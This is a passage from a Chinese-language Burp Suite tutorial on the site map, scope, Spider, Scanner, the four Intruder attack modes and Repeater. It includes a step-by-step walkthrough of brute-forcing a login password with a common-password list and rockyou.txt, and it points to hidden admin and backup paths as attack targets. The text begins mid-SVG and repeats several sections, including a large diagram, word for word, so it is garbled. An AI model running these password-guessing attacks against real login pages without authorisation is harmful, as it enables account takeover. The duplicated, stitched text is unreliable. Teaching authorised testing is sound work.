  </g>
</svg>

**界面结构：**

左侧是树状结构，展示网站层级：
```
www.example.com
├── /index.html
├── /login
├── /admin
│   ├── /admin/dashboard
│   ├── /admin/users
│   └── /admin/settings
├── /images
│   ├── logo.png
│   └── banner.jpg
└── /api
    ├── /api/users
    └── /api/products
```

右侧显示选中项的详细信息：
- 请求内容
- 响应内容
- 分析结果

**颜色含义：**

站点地图中的项目有不同颜色，代表不同含义：

| 颜色 | 含义 |
|------|------|
| 黑色 | 普通请求，无特殊发现 |
| 红色 | 发现问题/漏洞 |
| 橙色 | 需要注意的请求 |
| 蓝色 | 用户手动发送的请求 |
| 绿色 | 通过Spider爬取的请求 |

**实用技巧：**

1. **快速分析**：右键点击站点 → "Engagement tools" → "Analyze target"
   会自动分析目标的技术栈、使用的框架等

2. **导出站点地图**：右键点击站点 → "Save selected items"
   可以保存站点地图供后续分析

3. **发送到其他模块**：右键点击任意URL → 选择发送到其他模块

### Scope（测试范围）详解

**为什么要设置范围？**

测试时，你可能只想测试特定网站，不想测试其他网站。设置范围可以：
- 防止误测试其他网站
- 减少干扰流量
- 提高扫描效率

**设置范围：**

1. 点击"Scope"子标签
2. 选择"Include in scope"（包含在范围）或"Exclude from scope"（排除出范围）
3. 点击"Add"添加规则

**规则类型：**

| 规则类型 | 说明 | 示例 |
|----------|------|------|
| Host or IP | 主机名或IP | example.com |
| Host or IP range | IP范围 | 192.168.1.0/24 |
| URL prefix | URL前缀 | https://example.com/admin |
| Protocol | 协议 | 只包含HTTPS |
| Port | 端口 | 只包含443端口 |
| File extension | 文件扩展名 | 只包含.php文件 |

**实战设置：**

假设你要测试`https://target.example.com`，建议设置：
- Include in scope: `https://target.example.com`
- Exclude from scope: `https://target.example.com/static/*`

这样可以排除静态资源（图片、CSS等），提高效率。

---

## 1.11 Spider模块详解

### Spider模块是什么？

Spider（爬虫）就像一只勤劳的小蜘蛛，它会自动在目标网站上爬行，发现网站的每一个角落。

想象你走进一个陌生的大楼，想要了解大楼的每个房间。Spider就是帮你自动探索的机器人，它会：
- 从首页开始
- 找到所有链接
- 跟随链接访问新页面
- 发现更多链接
- 继续访问...

最终，Spider会帮你绘制出网站的完整地图。

### Spider的使用方法

**步骤1：设置目标**

首先，确保Target模块中有目标网站的信息：
- 手动浏览网站，Proxy会记录请求到Target
- 或在Target中手动添加URL

**步骤2：启动Spider**

1. 点击"Target" → "Site map"
2. 右键点击目标域名
3. 选择"Spider this host"
4. Spider开始工作

**步骤3：配置Spider选项**

点击"Spider"标签 → "Options"，可以配置：

| 选项 | 说明 |
|------|------|
| Maximum crawl depth | 最大爬取深度，防止无限爬取 |
| Maximum link count | 最大链接数量，限制爬取数量 |
| Request headers | 自定义请求头 |
| Form submission | 是否自动提交表单 |
| Follow redirects | 是否跟随重定向 |

### Spider工作过程

Spider工作时，你会看到：
- 正在爬取的URL数量持续增加
- Target站点地图中不断出现新页面
- HTTP history中记录所有Spider请求

**Spider完成后的结果：**

1. 站点地图变完整，包含所有发现的页面
2. 可以看到网站的完整结构
3. 可以发现隐藏页面（如管理员后台）

### 实战：爬取目标网站

让我们实战一下：

1. 在浏览器访问目标网站首页
2. Burp Suite记录首页到Target
3. 右键首页 → "Spider this host"
4. 等待Spider完成
5. 查看站点地图，发现所有页面

**发现隐藏页面：**

Spider可能会发现一些意想不到的页面：
- `/admin` - 管理后台
- `/backup` - 备份目录
- `/test` - 测试环境
- `/api/internal` - 内部API

这些都是潜在的攻击目标！

---

## 1.12 Scanner模块详解（专业版）

### Scanner模块是什么？

Scanner就像一个"体检医生"，它会自动检查网站的每个页面，寻找潜在的漏洞。

想象你去医院体检，医生会检查你的各项指标：
- 血压、血糖、胆固醇...
- 发现异常指标会报告给你

Scanner做的事情类似，它检查网站的各项"指标"：
- SQL注入风险
- XSS漏洞风险
- CSRF漏洞风险
- ...

发现异常后，Scanner会生成报告，告诉你哪里有问题。

### Scanner的使用方法

**注意：Scanner功能只有专业版才有！**

**方式一：主动扫描**

主动扫描会主动向目标发送测试请求：

1. 在Target站点地图中选择目标
2. 右键 → "Actively scan this host"
3. Scanner开始主动测试
4. 结果显示在"Scanner"标签中

**方式二：被动扫描**

被动扫描只分析已抓取的流量，不发送新请求：

1. Scanner默认开启被动扫描
2. 每次抓包时，Scanner自动分析
3. 发现问题自动报告

### Scanner报告解读

Scanner发现的问题会显示在"Scanner"标签中，分为几个严重级别：

| 级别 | 颜色 | 说明 |
|------|------|------|
| High | 红色 | 高危漏洞，需要立即修复 |
| Medium | 橙色 | 中危漏洞，需要尽快修复 |
| Low | 黄色 | 低危漏洞，建议修复 |
| Information | 蓝色 | 信息类，提供参考 |

点击每个问题，可以看到详细信息：
- 问题名称
- 问题描述
- 修复建议
- 请求和响应示例

---

## 1.13 Intruder模块详解

### Intruder模块是什么？

Intruder（入侵者）就像一个"暴力攻击机器"，它可以自动发送大量不同的请求，用于：

- **暴力破解密码**：尝试各种可能的密码组合
- **Fuzz测试**：向参数注入各种特殊字符，测试是否有漏洞
- **枚举信息**：尝试各种ID值，获取隐藏数据

想象你要打开一个密码锁，有10000种可能的密码。手动尝试太慢了，你需要一个机器帮你快速尝试。Intruder就是这样的机器。

### Intruder的四种攻击模式

Intruder有四种攻击模式，每种模式有不同的用途：

**🎯 Intruder 四种攻击模式对比详解：**

<svg viewBox="0 0 800 500" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="intrBg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0c0a1f"/>
      <stop offset="100%" stop-color="#1e293b"/>
    </linearGradient>
  </defs>
  <rect width="800" height="500" rx="14" fill="url(#intrBg)"/>
  <text x="400" y="28" text-anchor="middle" fill="#e2e8f0" font-size="17" font-weight="bold" font-family="Arial">🎯 Intruder 四种攻击模式（Payload Positions × Payloads 的组合方式）</text>

  <!-- 示例：请求中有2个payload位置 -->
  <g transform="translate(12, 42)">
    <rect x="0" y="0" width="776" height="42" rx="6" fill="#1e1b4b" stroke="#6d28d9" stroke-width="1.5"/>
    <text x="14" y="26" fill="#ddd6fe" font-size="13" font-family="Arial" font-weight="bold">📝 场景示例：请求中有 2 个注入位置（用 §包裹），2 个 payload 字典 A=[A1,A2,A3]、B=[B1,B2,B3]</text>
  </g>

  <!-- 2x2 四个模式卡片 -->
  <!-- ① Sniper -->
  <g transform="translate(12, 96)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
    <rect x="0" y="0" width="100" height="28" rx="10" fill="#f59e0b"/>
    <rect x="0" y="14" width="100" height="14" fill="#f59e0b"/>
    <text x="50" y="20" text-anchor="middle" fill="#000" font-size="13" font-weight="bold" font-family="Arial">① Sniper</text>
    <text x="116" y="22" fill="#fbbf24" font-size="13" font-weight="bold" font-family="Arial">🎯 狙击：单字典 · 逐位置逐个替换</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="74" fill="#fde047">A1        -       （第1次：只替换位置1）</text>
      <text x="14" y="92" fill="#fde047">A2        -       （第2次：只替换位置1）</text>
      <text x="14" y="110" fill="#fde047">A3        -       （第3次：只替换位置1）</text>
      <text x="14" y="130" fill="#fde047">-         A1      （第4次：切到位置2开始）</text>
      <text x="14" y="148" fill="#fde047">-         A2      （第5次）</text>
      <text x="14" y="166" fill="#fde047">-         A3      （第6次）</text>
    </g>
    <text x="14" y="180" fill="#fcd34d" font-size="11" font-family="Arial">✅ 总请求 = 字典长度 × 位置数 = 3 × 2 = 6 次 &#124; 单参数爆破最常用</text>
  </g>
  <!-- ② Battering ram -->
  <g transform="translate(402, 96)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="2"/>
    <rect x="0" y="0" width="130" height="28" rx="10" fill="#ec4899"/>
    <rect x="0" y="14" width="130" height="14" fill="#ec4899"/>
    <text x="65" y="20" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold" font-family="Arial">② Battering ram</text>
    <text x="146" y="22" fill="#f472b6" font-size="13" font-weight="bold" font-family="Arial">🔨 撞锤：单字典 · 所有位置同时放相同值</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="78" fill="#f9a8d4">A1        A1      （两位置同时替换为A1）</text>
      <text x="14" y="100" fill="#f9a8d4">A2        A2      （两位置同时替换为A2）</text>
      <text x="14" y="122" fill="#f9a8d4">A3        A3      （两位置同时替换为A3）</text>
      <text x="14" y="152" fill="#fda4af" font-size="11" font-family="Arial">💡 场景：用户名=密码=字典里的值（账号密码相同测试）、两个参数要一样的测试</text>
    </g>
    <text x="14" y="180" fill="#fbcfe8" font-size="11" font-family="Arial">✅ 总请求 = 字典长度 = 3 次</text>
  </g>

  <!-- ③ Pitchfork -->
  <g transform="translate(12, 294)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#3b82f6" stroke-width="2"/>
    <rect x="0" y="0" width="102" height="28" rx="10" fill="#3b82f6"/>
    <rect x="0" y="14" width="102" height="14" fill="#3b82f6"/>
    <text x="51" y="20" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold" font-family="Arial">③ Pitchfork</text>
    <text x="118" y="22" fill="#60a5fa" font-size="13" font-weight="bold" font-family="Arial">🌾 叉耙：多字典 · 按行配对，一行一行取</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">字典A     字典B     →</text>
      <text x="14" y="74" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="96" fill="#93c5fd">A1        B1      （第1行对第1行）</text>
      <text x="14" y="118" fill="#93c5fd">A2        B2      （第2行对第2行）</text>
      <text x="14" y="140" fill="#93c5fd">A3        B3      （第3行对第3行）</text>
      <text x="14" y="162" fill="#60a5fa" font-size="11" font-family="Arial">💡 场景：一对已知的用户名+密码对应表、账号验证码成对爆破</text>
    </g>
    <text x="14" y="180" fill="#bfdbfe" font-size="11" font-family="Arial">✅ 总请求 = 最短字典的长度 = 3 次（有一个字典用完就停）</text>
  </g>
  <!-- ④ Cluster bomb -->
  <g transform="translate(402, 294)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
    <rect x="0" y="0" width="132" height="28" rx="10" fill="#10b981"/>
    <rect x="0" y="14" width="132" height="14" fill="#10b981"/>
    <text x="66" y="20" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold" font-family="Arial">④ Cluster bomb</text>
    <text x="148" y="22" fill="#34d399" font-size="13" font-weight="bold" font-family="Arial">💣 集束：多字典 · 笛卡尔积·所有组合全试一遍</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="74" fill="#6ee7b7">A1        B1</text>
      <text x="200" y="74" fill="#6ee7b7">A1        B2</text>
      <text x="310" y="74" fill="#6ee7b7">A1        B3</text>
      <text x="14" y="96" fill="#6ee7b7">A2        B1</text>
      <text x="200" y="96" fill="#6ee7b7">A2        B2</text>
      <text x="310" y="96" fill="#6ee7b7">A2        B3</text>
      <text x="14" y="118" fill="#6ee7b7">A3        B1</text>
      <text x="200" y="118" fill="#6ee7b7">A3        B2</text>
      <text x="310" y="118" fill="#6ee7b7">A3        B3</text>
      <text x="14" y="148" fill="#34d399" font-size="11" font-family="Arial">💡 场景：账号任意 + 密码任意（登录框用户+密码全量组合爆破）⚠ 最常用也最慢</text>
      <text x="14" y="168" fill="#ef4444" font-size="11" font-weight="bold" font-family="Arial">⚠️ 2个1000行字典会产生 100万 请求！注意控制范围</text>
    </g>
    <text x="14" y="180" fill="#a7f3d0" font-size="11" font-family="Arial">✅ 总请求 = len(A) × len(B) × len(C)...  = 3 × 3 = 9 次</text>
  </g>


**界面结构：**

左侧是树状结构，展示网站层级：
```
www.example.com
├── /index.html
├── /login
├── /admin
│   ├── /admin/dashboard
│   ├── /admin/users
│   └── /admin/settings
├── /images
│   ├── logo.png
│   └── banner.jpg
└── /api
    ├── /api/users
    └── /api/products
```

右侧显示选中项的详细信息：
- 请求内容
- 响应内容
- 分析结果

**颜色含义：**

站点地图中的项目有不同颜色，代表不同含义：

| 颜色 | 含义 |
|------|------|
| 黑色 | 普通请求，无特殊发现 |
| 红色 | 发现问题/漏洞 |
| 橙色 | 需要注意的请求 |
| 蓝色 | 用户手动发送的请求 |
| 绿色 | 通过Spider爬取的请求 |

**实用技巧：**

1. **快速分析**：右键点击站点 → "Engagement tools" → "Analyze target"
   会自动分析目标的技术栈、使用的框架等

2. **导出站点地图**：右键点击站点 → "Save selected items"
   可以保存站点地图供后续分析

3. **发送到其他模块**：右键点击任意URL → 选择发送到其他模块

### Scope（测试范围）详解

**为什么要设置范围？**

测试时，你可能只想测试特定网站，不想测试其他网站。设置范围可以：
- 防止误测试其他网站
- 减少干扰流量
- 提高扫描效率

**设置范围：**

1. 点击"Scope"子标签
2. 选择"Include in scope"（包含在范围）或"Exclude from scope"（排除出范围）
3. 点击"Add"添加规则

**规则类型：**

| 规则类型 | 说明 | 示例 |
|----------|------|------|
| Host or IP | 主机名或IP | example.com |
| Host or IP range | IP范围 | 192.168.1.0/24 |
| URL prefix | URL前缀 | https://example.com/admin |
| Protocol | 协议 | 只包含HTTPS |
| Port | 端口 | 只包含443端口 |
| File extension | 文件扩展名 | 只包含.php文件 |

**实战设置：**

假设你要测试`https://target.example.com`，建议设置：
- Include in scope: `https://target.example.com`
- Exclude from scope: `https://target.example.com/static/*`

这样可以排除静态资源（图片、CSS等），提高效率。

---

## 1.11 Spider模块详解

### Spider模块是什么？

Spider（爬虫）就像一只勤劳的小蜘蛛，它会自动在目标网站上爬行，发现网站的每一个角落。

想象你走进一个陌生的大楼，想要了解大楼的每个房间。Spider就是帮你自动探索的机器人，它会：
- 从首页开始
- 找到所有链接
- 跟随链接访问新页面
- 发现更多链接
- 继续访问...

最终，Spider会帮你绘制出网站的完整地图。

### Spider的使用方法

**步骤1：设置目标**

首先，确保Target模块中有目标网站的信息：
- 手动浏览网站，Proxy会记录请求到Target
- 或在Target中手动添加URL

**步骤2：启动Spider**

1. 点击"Target" → "Site map"
2. 右键点击目标域名
3. 选择"Spider this host"
4. Spider开始工作

**步骤3：配置Spider选项**

点击"Spider"标签 → "Options"，可以配置：

| 选项 | 说明 |
|------|------|
| Maximum crawl depth | 最大爬取深度，防止无限爬取 |
| Maximum link count | 最大链接数量，限制爬取数量 |
| Request headers | 自定义请求头 |
| Form submission | 是否自动提交表单 |
| Follow redirects | 是否跟随重定向 |

### Spider工作过程

Spider工作时，你会看到：
- 正在爬取的URL数量持续增加
- Target站点地图中不断出现新页面
- HTTP history中记录所有Spider请求

**Spider完成后的结果：**

1. 站点地图变完整，包含所有发现的页面
2. 可以看到网站的完整结构
3. 可以发现隐藏页面（如管理员后台）

### 实战：爬取目标网站

让我们实战一下：

1. 在浏览器访问目标网站首页
2. Burp Suite记录首页到Target
3. 右键首页 → "Spider this host"
4. 等待Spider完成
5. 查看站点地图，发现所有页面

**发现隐藏页面：**

Spider可能会发现一些意想不到的页面：
- `/admin` - 管理后台
- `/backup` - 备份目录
- `/test` - 测试环境
- `/api/internal` - 内部API

这些都是潜在的攻击目标！

---

## 1.12 Scanner模块详解（专业版）

### Scanner模块是什么？

Scanner就像一个"体检医生"，它会自动检查网站的每个页面，寻找潜在的漏洞。

想象你去医院体检，医生会检查你的各项指标：
- 血压、血糖、胆固醇...
- 发现异常指标会报告给你

Scanner做的事情类似，它检查网站的各项"指标"：
- SQL注入风险
- XSS漏洞风险
- CSRF漏洞风险
- ...

发现异常后，Scanner会生成报告，告诉你哪里有问题。

### Scanner的使用方法

**注意：Scanner功能只有专业版才有！**

**方式一：主动扫描**

主动扫描会主动向目标发送测试请求：

1. 在Target站点地图中选择目标
2. 右键 → "Actively scan this host"
3. Scanner开始主动测试
4. 结果显示在"Scanner"标签中

**方式二：被动扫描**

被动扫描只分析已抓取的流量，不发送新请求：

1. Scanner默认开启被动扫描
2. 每次抓包时，Scanner自动分析
3. 发现问题自动报告

### Scanner报告解读

Scanner发现的问题会显示在"Scanner"标签中，分为几个严重级别：

| 级别 | 颜色 | 说明 |
|------|------|------|
| High | 红色 | 高危漏洞，需要立即修复 |
| Medium | 橙色 | 中危漏洞，需要尽快修复 |
| Low | 黄色 | 低危漏洞，建议修复 |
| Information | 蓝色 | 信息类，提供参考 |

点击每个问题，可以看到详细信息：
- 问题名称
- 问题描述
- 修复建议
- 请求和响应示例

---

## 1.13 Intruder模块详解

### Intruder模块是什么？

Intruder（入侵者）就像一个"暴力攻击机器"，它可以自动发送大量不同的请求，用于：

- **暴力破解密码**：尝试各种可能的密码组合
- **Fuzz测试**：向参数注入各种特殊字符，测试是否有漏洞
- **枚举信息**：尝试各种ID值，获取隐藏数据

想象你要打开一个密码锁，有10000种可能的密码。手动尝试太慢了，你需要一个机器帮你快速尝试。Intruder就是这样的机器。

### Intruder的四种攻击模式

Intruder有四种攻击模式，每种模式有不同的用途：

**🎯 Intruder 四种攻击模式对比详解：**

<svg viewBox="0 0 800 500" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="intrBg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0c0a1f"/>
      <stop offset="100%" stop-color="#1e293b"/>
    </linearGradient>
  </defs>
  <rect width="800" height="500" rx="14" fill="url(#intrBg)"/>
  <text x="400" y="28" text-anchor="middle" fill="#e2e8f0" font-size="17" font-weight="bold" font-family="Arial">🎯 Intruder 四种攻击模式（Payload Positions × Payloads 的组合方式）</text>

  <!-- 示例：请求中有2个payload位置 -->
  <g transform="translate(12, 42)">
    <rect x="0" y="0" width="776" height="42" rx="6" fill="#1e1b4b" stroke="#6d28d9" stroke-width="1.5"/>
    <text x="14" y="26" fill="#ddd6fe" font-size="13" font-family="Arial" font-weight="bold">📝 场景示例：请求中有 2 个注入位置（用 §包裹），2 个 payload 字典 A=[A1,A2,A3]、B=[B1,B2,B3]</text>
  </g>

  <!-- 2x2 四个模式卡片 -->
  <!-- ① Sniper -->
  <g transform="translate(12, 96)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
    <rect x="0" y="0" width="100" height="28" rx="10" fill="#f59e0b"/>
    <rect x="0" y="14" width="100" height="14" fill="#f59e0b"/>
    <text x="50" y="20" text-anchor="middle" fill="#000" font-size="13" font-weight="bold" font-family="Arial">① Sniper</text>
    <text x="116" y="22" fill="#fbbf24" font-size="13" font-weight="bold" font-family="Arial">🎯 狙击：单字典 · 逐位置逐个替换</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="74" fill="#fde047">A1        -       （第1次：只替换位置1）</text>
      <text x="14" y="92" fill="#fde047">A2        -       （第2次：只替换位置1）</text>
      <text x="14" y="110" fill="#fde047">A3        -       （第3次：只替换位置1）</text>
      <text x="14" y="130" fill="#fde047">-         A1      （第4次：切到位置2开始）</text>
      <text x="14" y="148" fill="#fde047">-         A2      （第5次）</text>
      <text x="14" y="166" fill="#fde047">-         A3      （第6次）</text>
    </g>
    <text x="14" y="180" fill="#fcd34d" font-size="11" font-family="Arial">✅ 总请求 = 字典长度 × 位置数 = 3 × 2 = 6 次 &#124; 单参数爆破最常用</text>
  </g>
  <!-- ② Battering ram -->
  <g transform="translate(402, 96)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="2"/>
    <rect x="0" y="0" width="130" height="28" rx="10" fill="#ec4899"/>
    <rect x="0" y="14" width="130" height="14" fill="#ec4899"/>
    <text x="65" y="20" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold" font-family="Arial">② Battering ram</text>
    <text x="146" y="22" fill="#f472b6" font-size="13" font-weight="bold" font-family="Arial">🔨 撞锤：单字典 · 所有位置同时放相同值</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="78" fill="#f9a8d4">A1        A1      （两位置同时替换为A1）</text>
      <text x="14" y="100" fill="#f9a8d4">A2        A2      （两位置同时替换为A2）</text>
      <text x="14" y="122" fill="#f9a8d4">A3        A3      （两位置同时替换为A3）</text>
      <text x="14" y="152" fill="#fda4af" font-size="11" font-family="Arial">💡 场景：用户名=密码=字典里的值（账号密码相同测试）、两个参数要一样的测试</text>
    </g>
    <text x="14" y="180" fill="#fbcfe8" font-size="11" font-family="Arial">✅ 总请求 = 字典长度 = 3 次</text>
  </g>

  <!-- ③ Pitchfork -->
  <g transform="translate(12, 294)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#3b82f6" stroke-width="2"/>
    <rect x="0" y="0" width="102" height="28" rx="10" fill="#3b82f6"/>
    <rect x="0" y="14" width="102" height="14" fill="#3b82f6"/>
    <text x="51" y="20" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold" font-family="Arial">③ Pitchfork</text>
    <text x="118" y="22" fill="#60a5fa" font-size="13" font-weight="bold" font-family="Arial">🌾 叉耙：多字典 · 按行配对，一行一行取</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">字典A     字典B     →</text>
      <text x="14" y="74" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="96" fill="#93c5fd">A1        B1      （第1行对第1行）</text>
      <text x="14" y="118" fill="#93c5fd">A2        B2      （第2行对第2行）</text>
      <text x="14" y="140" fill="#93c5fd">A3        B3      （第3行对第3行）</text>
      <text x="14" y="162" fill="#60a5fa" font-size="11" font-family="Arial">💡 场景：一对已知的用户名+密码对应表、账号验证码成对爆破</text>
    </g>
    <text x="14" y="180" fill="#bfdbfe" font-size="11" font-family="Arial">✅ 总请求 = 最短字典的长度 = 3 次（有一个字典用完就停）</text>
  </g>
  <!-- ④ Cluster bomb -->
  <g transform="translate(402, 294)">
    <rect x="0" y="0" width="386" height="186" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
    <rect x="0" y="0" width="132" height="28" rx="10" fill="#10b981"/>
    <rect x="0" y="14" width="132" height="14" fill="#10b981"/>
    <text x="66" y="20" text-anchor="middle" fill="#fff" font-size="13" font-weight="bold" font-family="Arial">④ Cluster bomb</text>
    <text x="148" y="22" fill="#34d399" font-size="13" font-weight="bold" font-family="Arial">💣 集束：多字典 · 笛卡尔积·所有组合全试一遍</text>
    <g font-family="Consolas, monospace" font-size="12">
      <text x="14" y="52" fill="#94a3b8">位置 §1§   位置 §2§   →</text>
      <text x="14" y="74" fill="#6ee7b7">A1        B1</text>
      <text x="200" y="74" fill="#6ee7b7">A1        B2</text>
      <text x="310" y="74" fill="#6ee7b7">A1        B3</text>
      <text x="14" y="96" fill="#6ee7b7">A2        B1</text>
      <text x="200" y="96" fill="#6ee7b7">A2        B2</text>
      <text x="310" y="96" fill="#6ee7b7">A2        B3</text>
      <text x="14" y="118" fill="#6ee7b7">A3        B1</text>
      <text x="200" y="118" fill="#6ee7b7">A3        B2</text>
      <text x="310" y="118" fill="#6ee7b7">A3        B3</text>
      <text x="14" y="148" fill="#34d399" font-size="11" font-family="Arial">💡 场景：账号任意 + 密码任意（登录框用户+密码全量组合爆破）⚠ 最常用也最慢</text>
      <text x="14" y="168" fill="#ef4444" font-size="11" font-weight="bold" font-family="Arial">⚠️ 2个1000行字典会产生 100万 请求！注意控制范围</text>
    </g>
    <text x="14" y="180" fill="#a7f3d0" font-size="11" font-family="Arial">✅ 总请求 = len(A) × len(B) × len(C)...  = 3 × 3 = 9 次</text>
  </g>
</svg>

#### 1. Sniper模式（狙击模式）

**特点**：单目标，单payload

**通俗理解**：一把枪，瞄准一个靶子，换不同子弹射击

**工作原理**：
- 选择一个位置（比如密码字段）
- 使用一个payload列表（比如1000个密码）
- 逐个尝试每个密码

**适用场景**：
- 测试单个参数
- 爆破单个密码字段

**示例**：
```
请求：POST /login username=admin&password=§test§

Payload列表：
test
123456
admin
password
...

执行过程：
第1次：password=test
第2次：password=123456
第3次：password=admin
...
```

#### 2. Battering ram模式（攻城锤模式）

**特点**：多目标，单payload

**通俗理解**：一把枪，瞄准多个靶子，每次用相同的子弹

**工作原理**：
- 选择多个位置（比如用户名和密码）
- 使用一个payload列表
- 每次请求，所有位置使用相同payload

**适用场景**：
- 测试用户名=密码的情况

**示例**：
```
请求：POST /login username=§user§&password=§pass§

Payload列表：
admin
test
root
...

执行过程：
第1次：username=admin&password=admin
第2次：username=test&password=test
第3次：username=root&password=root
...
```

#### 3. Pitchfork模式（叉子模式）

**特点**：多目标，多payload（一对一）

**通俗理解**：一把双管猎枪，瞄准两个靶子，每管用不同的子弹序列

**工作原理**：
- 选择多个位置
- 每个位置使用不同的payload列表
- 同步迭代，一对一匹配

**适用场景**：
- 用户名和密码配对爆破（已知用户名，尝试对应密码）

**示例**：
```
请求：POST /login username=§user§&password=§pass§

用户名列表：admin, user, guest
密码列表：admin123, user456, guest789

执行过程：
第1次：username=admin&password=admin123
第2次：username=user&password=user456
第3次：username=guest&password=guest789
```

#### 4. Cluster bomb模式（集束炸弹模式）

**特点**：多目标，多payload（全排列）

**通俗理解**：一把超级武器，瞄准多个靶子，每管用不同子弹，且组合所有可能

**工作原理**：
- 选择多个位置
- 每个位置使用不同的payload列表
- 全排列组合

**适用场景**：
- 用户名和密码组合爆破（不知道哪个用户名配哪个密码）

**示例**：
```
请求：POST /login username=§user§&password=§pass§

用户名列表：admin, user
密码列表：123, 456

执行过程（2×2=4次）：
第1次：username=admin&password=123
第2次：username=admin&password=456
第3次：username=user&password=123
第4次：username=user&password=456
```

### Intruder使用步骤

**步骤1：发送请求到Intruder**

1. 在Proxy HTTP history中选择一个请求
2. 右键 → "Send to Intruder"
3. 切换到Intruder标签

**步骤2：设置攻击位置**

1. 点击"Positions"子标签
2. Burp Suite会自动用§符号标记一些位置
3. 你可以手动添加或删除标记：
   - 选中文本，点击"Add §"添加标记
   - 点击"Clear §"清除所有标记

**步骤3：选择攻击模式**

在"Attack type"下拉框中选择：
- Sniper
- Battering ram
- Pitchfork
- Cluster bomb

**步骤4：配置Payload**

点击"Payloads"子标签：

1. 设置Payload数量（根据攻击模式）
2. 选择Payload类型：
   - Simple list：简单列表
   - Runtime file：从文件读取
   - Numbers：数字范围
   - Brute forcer：暴力破解字符组合
   - Custom iterator：自定义迭代器

3. 添加Payload内容：
   - 手动输入列表项
   - 或从文件导入

**步骤5：配置选项**

点击"Options"子标签，可以设置：
- Request Engine：并发数、延迟等
- Grep - Match：匹配响应中的特定内容
- Grep - Extract：提取响应中的特定内容

**步骤6：启动攻击**

点击右上角"Start attack"按钮，攻击开始。

**步骤7：分析结果**

攻击窗口会显示所有请求和响应：

| 列 | 说明 |
|------|------|
| Request # | 请求序号 |
| Payload | 使用的payload |
| Status | 响应状态码 |
| Length | 响应长度 |
| Time | 响应时间 |
| Result | 匹配结果 |

**发现成功请求的技巧：**

1. **状态码不同**：成功的请求可能返回302重定向或200
2. **长度不同**：成功的响应长度可能与失败不同
3. **匹配关键词**：配置Grep-Match搜索"成功"、"登录成功"等关键词

### 实战：暴力破解登录密码

让我们实战一下，假设目标网站：`http://target.example.com/login`

**步骤1：抓取登录请求**

1. 配置浏览器代理
2. 在浏览器中访问登录页面
3. 输入测试用户名密码（如test/test）
4. 点击登录
5. Burp Suite拦截登录请求

你会看到类似这样的请求：
```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

**步骤2：发送到Intruder**

右键请求 → "Send to Intruder"

**步骤3：设置攻击位置**

假设我们知道用户名是admin，只需要爆破密码：

1. 点击Positions标签
2. 清除所有§标记
3. 只在password值前后添加§标记：
   `username=admin&password=§test§`

3. 选择攻击模式：Sniper

**步骤4：配置Payload**

1. 点击Payloads标签
2. Payload type: Simple list
3. 添加常用密码：
   ```
   123456
   password
   admin
   admin123
   123456789
   qwerty
   letmein
   welcome
   monkey
   dragon
   ...
   ```

或者使用密码字典文件：
- Runtime file
- 选择字典文件（如rockyou.txt的一部分）

**步骤5：配置成功匹配**

点击Options标签：
- Grep - Match
- 添加关键词："登录成功"、"success"、"welcome"

或者观察失败响应的特征，比如包含"密码错误"，成功的响应应该不包含这个。

**步骤6：启动攻击**

点击"Start attack"

**步骤7：分析结果**

观察攻击窗口：
- 找到状态码不同的请求（如302）
- 找到长度不同的请求
- 找到匹配到关键词的请求

如果某个请求返回302重定向到`/dashboard`，说明密码正确！

### Payload类型详解

| Payload类型 | 说明 | 适用场景 |
|-------------|------|----------|
| Simple list | 简单列表 | 自定义少量payload |
| Runtime file | 从文件读取 | 大型字典文件 |
| Numbers | 数字范围 | 遍历ID、年份等 |
| Brute forcer | 暴力字符组合 | 短密码暴力破解 |
| Custom iterator | 自定义迭代器 | 复杂组合 |
| Character blocks | 字符块 | 测试缓冲区溢出 |
| Case modification | 大小写变换 | 测试大小写敏感 |
| Regex generator | 正则生成 | 按正则规则生成 |
| Payload encoding | 编码转换 | URL编码、Base64等 |

---

## 1.14 Repeater模块详解

### Repeater模块是什么？

Repeater（重发器）就像一个"实验工作台"，让你可以手工修改请求并反复发送，观察服务器响应的变化。

想象你在写信测试朋友的反应：
- 第一封信写"你好"
- 第二封信写"你好啊"
- 第三封信写"你好吗"

通过对比朋友的回复，了解不同内容的影响。

Repeater就是这样：
- 发送原始请求
